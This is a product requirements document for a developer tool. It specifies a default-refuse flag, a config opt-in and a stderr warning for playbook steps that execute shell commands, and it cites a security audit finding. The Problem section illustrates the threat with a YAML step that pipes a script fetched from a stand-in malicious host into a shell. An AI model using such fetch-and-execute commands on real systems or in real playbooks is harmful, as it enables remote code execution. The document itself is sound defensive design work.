---
depth: standard
id: PRD-074
kind: prd
last_modified_at: 2026-05-05T22:09:17.712637+00:00
last_modified_by: claude-code/2.1.128
links:
- target: PROB-053
  relation: refines
status: active
title: Shell-execution gate for Delegation::Command
---

# PRD-074: Shell-execution gate for Delegation::Command

## Problem

`Delegation::Command { command: Vec<String> }` (`crates/forgeplan-core/src/playbook/types.rs:195` + dispatch impl in `command_dispatcher.rs:116+`) parses directly from YAML and executes arbitrary shell commands without:

- allowlist
- signing
- user-visible warning (only silent `tracing::warn!` буриed unless `RUST_LOG` enables it)

A malicious playbook YAML — or any playbook loaded from network / marketplace / unsigned source — can specify:

```yaml
- id: malicious-step
  delegate_to:
    command: ["/bin/sh", "-c", "curl evil.sh | sh"]
```

Module documentation at `command_dispatcher.rs:7` explicitly calls this "the most security-sensitive dispatcher" yet has no compile-time or runtime gate. The only mitigation is operator vigilance.

PR-E Round 6 adversarial security audit (2026-05-05) flagged this as **CWE-78 / CWE-94 MED-2**. Tracked as PROB-053. Marketplace plugin distribution is in design (PRD-067/068/069 — orchestrator skill stack), making this a near-term blocker rather than a theoretical risk.

This PRD scopes the **safety net** — a CLI flag + workspace config opt-in + user-visible warning. **Marketplace signing scheme is explicitly out of scope** (deferred to follow-up PRD/PROB) because rushing manifest format / key management / verification flow design while marketplace fetch infrastructure does not yet exist would be premature design.

## Goals

1. **Default refuse** (FR-001): `forgeplan playbook run` with a YAML containing `Delegation::Command` exits non-zero with a typed `DispatchError` and a `Fix:` hint pointing to the new flag.
2. **Explicit opt-in** (FR-001, FR-002): `--allow-shell` CLI flag enables shell execution for the current invocation; `[playbook] allow_shell = true` in workspace config enables for trusted-local workflows.
3. **User-visible warning** (FR-003): every `Delegation::Command` step prints `! shell-exec: <argv[0]> [N args]` to stderr **before** execution. Operator-readable, never tracing-buried.
4. **Backwards compatible local playbooks** (FR-004): existing `audit.yaml` / `release.yaml` / `brownfield-docs.yaml` keep working when invoked with `--allow-shell` (or with the workspace config flag set). Reference YAML headers updated to document the requirement.
5. **Hint Protocol compliance** (FR-005, references PRD-071): refuse path emits `Error:` + `Fix:` markers; success path stays unchanged.
6. **MCP parity** (FR-006): if `forgeplan_playbook_run` MCP tool exists, expose equivalent `allow_shell` parameter с тем же default false.
7. **Test matrix proof** (FR-007): 4-cell test matrix (flag × config booleans) plus warning-emitted assertions on the run paths.

## Non-Goals

- **Marketplace signing scheme**: out of scope. Tracked as a separate follow-up (candidate: PROB-057 / PRD-075 в v0.31.0+). When marketplace fetch is implemented, signing + key store + verification flow will be designed end-to-end. Until then, `Delegation::Command` from any source (local trusted, local untrusted, marketplace) is gated identically by the flag.
- **Per-command granular allowlist** (e.g. allow `git` but not `curl`): out of scope. Boolean gate only — operator decides at invocation time.
- **Sandboxing / namespacing of the spawned subprocess** (chroot, seccomp, etc.): out of scope. The flag only controls *whether* shell execution is permitted, not *how* it is contained.
- **Migration tool to auto-add `--allow-shell`** to existing CI scripts: out of scope. Operators read the release notes + error messages.
- **Auto-detection of suspicious commands**: out of scope. Boolean gate only.

## Functional Requirements

- [x] **FR-001**: `forgeplan playbook run <path>` learns a `--allow-shell` boolean flag (default `false`). When `false`, dispatching `Delegation::Command` returns `DispatchError::Transport` with the message `shell execution refused — Delegation::Command requires explicit --allow-shell or [playbook] allow_shell = true in workspace config`.
- [x] **FR-002**: Workspace config (`.forgeplan/config.yaml`) learns a `[playbook] allow_shell = bool` opt-in (default `false`). When `true`, dispatching `Delegation::Command` proceeds **as if `--allow-shell` were set**. Documented in workspace config reference.
- [x] **FR-003**: When shell execution is permitted (FR-001 OR FR-002), the dispatcher MUST emit `! shell-exec: <argv[0]> [N args]` to stderr (eprintln, not tracing::warn) **before** spawning the subprocess. Operator MUST see the warning regardless of `RUST_LOG` settings.
- [x] **FR-004**: `audit.yaml`, `release.yaml`, `brownfield-docs.yaml` reference templates document the `--allow-shell` requirement in their headers (comment block at the top of each YAML).
- [x] **FR-005**: Hint Protocol (PRD-071) compliance — refuse path emits `Error: shell execution refused\nFix: forgeplan playbook run --allow-shell <path>`.
- [x] **FR-006**: MCP tool `forgeplan_playbook_run` (если exists) exposes equivalent `allow_shell: bool` parameter; same default `false`.
- [x] **FR-007**: Tests cover all four matrix cells: (flag=false, config=false) → refuse; (flag=true, config=false) → run; (flag=false, config=true) → run; (flag=true, config=true) → run. Plus warning-emitted check on the run paths.

## Target Users

- **Operators** invoking `forgeplan playbook run` for local automation (audit.yaml multi-agent reviews, release.yaml release checks). They MUST add `--allow-shell` to existing scripts after upgrade.
- **CI/CD pipeline maintainers** running playbooks in GitHub Actions / GitLab CI. They MUST add `--allow-shell` to pipeline yaml or set workspace config in repo's `.forgeplan/config.yaml`.
- **Future marketplace consumers** (PRD-067/068/069) downloading third-party playbooks. They benefit from default refuse — no auto-execution surface.
- **Security auditors** reviewing forgeplan for OWASP Top 10 / CWE-78 compliance. They benefit from a documented, testable, default-deny security boundary.

## Related Artifacts

| Artifact | Relation |
|---|---|
| PROB-053 | refines (this PRD scopes the closure of PROB-053 PR-E Round 6 audit MED-2) |
| PROB-050 | based_on (Phase B follow-ups umbrella; A-31 candidate for marketplace per-invocation override) |
| ADR-011 | informs (Phase B Wave 1 — claude --print dispatcher boundaries) |
| SPEC-003 | informs (playbook YAML schema — current 1.2 doesn't document Delegation::Command security model) |
| PRD-071 | informs (Hint Protocol — refuse path uses Error: + Fix: markers) |
| PRD-067 | informs (marketplace plugin install — first downstream consumer of the gate) |
| EPIC-003 | parent (multi-agent dispatch infrastructure) |

## Out of Scope (deferred to follow-up)

- Marketplace signing scheme (manifest format, key management, rotation, verification flow) — separate PRD when marketplace fetch ships
- Per-command allowlist (git=ok, curl=blocked) — boolean gate only
- Subprocess sandboxing (chroot, seccomp, AppArmor, etc.)
- Auto-detection of suspicious command patterns





